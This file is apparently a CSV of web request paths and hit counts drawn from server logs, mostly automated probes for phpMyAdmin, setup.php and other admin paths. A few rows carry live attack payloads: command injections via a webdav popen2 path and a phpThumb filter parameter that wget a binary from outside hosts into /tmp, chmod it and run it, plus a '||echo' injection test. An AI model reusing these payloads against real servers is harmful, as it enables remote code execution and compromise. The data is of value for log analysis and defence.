_id,value
/wamp/database/main.php,1
/bw/my/main.php,1
/sql/phpMyAdmin-2.6.0-rc3/main.php,10
/xampp/phpMyAdmin-2.11.2.1/main.php,1
/db/phpmy-admin/main.php,10
/sql/pMA2007/main.php,1
/mysql/phpMyAdmin-2.6.0-beta2/main.php,11
/datenbank/pma2006/main.php,1
/mysql/phpMyAdmin-2.9.0.1/main.php,1
/includes/lamp/main.php,1
/typo3/phpmyadmin2.11.5/main.php,1
/phpmyadmin_ysf,1
/bigdata/,12
/admin/phpMyAdmin-2.9.1.1/main.php,1
/phpmyadmin2/read_dump.phpmain.php,4
/phpMyAdmin-2.11.0-rc2/main.php,1
/phpmyadmin/themes/pmahomme/img/logo_left.png,1
/tools/projects/main.php,1
/Wenjie/,1
/admin/ldap/htdocs/,2
/database/mysql-admin/main.php,1
//p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=wget%20--output-document%20/tmp/ieh1%20http://202.28.76.20/ieh1,1
64.12.202.59:443,1
/tools/websites/main.php,1
/mysql/homepages/main.php,1
/db/pMA2006/main.php,10
/projects/includes/main.php,1
/p/m/a/scripts/setup.php,14
/phpldapadmin/scripts/setup.php,2
/phpMyAdmin-2.3.8/main.php,1
/typo3/web/main.php,1
/admin/sql/main.php,1
/typo3/PMA2008/main.php,1
/mvc/login/checkUser,3
/xamp/database/main.php,1
/capeco/plugins/access.ssh/checkInstall.php?destServer=%7C%7Cecho%2075855,1
/sql/cgi-bin/main.php,1
/dbadmin/phpmyadmin/main.php,1
/claroline/install/main.php,1
/phpMyAdmin-2.6.1/scripts/setup.php,7
/administrator/phpMyAdmin-2.6.1/main.php,10
/utilities/test/main.php,1
/nikita/FinalProject.zip,2
/admin/phpMyAdmin-2.10.0.2/main.php,1
/wamp/labtools/main.php,1
/phpmyadmin/install/main.php,1
/mysql/claroline/main.php,1
/www/phpmyadmin/main.php,1
/root/main.php,1
/webtoold,1
/_sql/utilities/main.php,1
/adm/dbadmin/main.php,1
/htdocs/mysql-admin/main.php,1
/phpMyAdmin-2.4.1/main.php,1
//README,4
/db/phpMyAdmin-2.5.7-pl1/main.php,10
/database/test/main.php,1
/phpmyadmin/js/get_image.js.php?theme=pmahomme,1
/admin/phpMyAdmin-2.11.0/main.php,1
/database/utilities/main.php,1
/admin/pma/translators.html,1
/typo3/phpMyAdmin-2.10.0-rc1/main.php,1
http://www.sciencedirect.com/science/browse/a,2
/sql/phpMyAdmin-2.9.0/main.php,1
/projects/install/main.php,1
/mysql/phpMyAdmin-2.8.2/main.php,10
/htdocs/phpmyadmin3/main.php,1
/administrator/phpMyAdmin-2.8.2.2/main.php,1
/remote-sql/db/main.php,1
/utilities/home/main.php,1
/htdocs/modules/main.php,1
/zadmin/tiny_mce/plugins/ibrowser/scripts/phpThumb/phpThumb.php?src=file.jpg&fltr[]=blur|9%20-quality%20%2075%20-interlace%20line%20fail.jpg%20jpeg:fail.jpg%20;%20ls%20-l%20/tmp;wget%20-O%20/tmp/barbut6%20bingoooo.co.uk/barbut6;chmod%200755%20/tmp/barbut6;/tmp/barbut6;ps%20-aux;%20&phpThumbDebug=9,3
//phpMyAdmin-2.8.0-rc1/,3
/projects/www/main.php,1
/phpmyadmin.old/scripts/setup.php,2
/phpMyAdmin-2.6.8/scripts/setup.php,2
/sqladmin/home/main.php,1
/cgi-bin/download/main.php,1
//p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=perl%20ieh1,1
/phpMyAdmin-2.6.1-rc1/scripts/setup.phpmain.php,1
/xamp/source/main.php,1
/source/wwwroot/main.php,1
/pma/web/main.php,1
/lamp/phpmyadmin3/main.php,1
/phpMyAdmin-2.5.5-rc1config/scripts/setup.php,5
//phpMyAdmin-2.5.6/index.php,22
/demo/mysql/main.php,1
/dbms/New%20Text%20Document.txt,1
/admin/my/main.php,1
/admin/bw/main.php,1
/home/phpmyadmin/main.php,1
/yusuf/biogen/images/e10.jpg,8
/xamp/labtools/main.php,1
/admin/phpMyAdmin-2.6.1-rc1/main.php,11
//forum//cache/,1
/admin/PMA2005/main.php,11
/xamp/projects/main.php,1
/db/read_dump.phpmain.php,4
/phpMyAdmin-2.6.2/scripts/setup.php,6
/lamp/cgi-bin/main.php,1
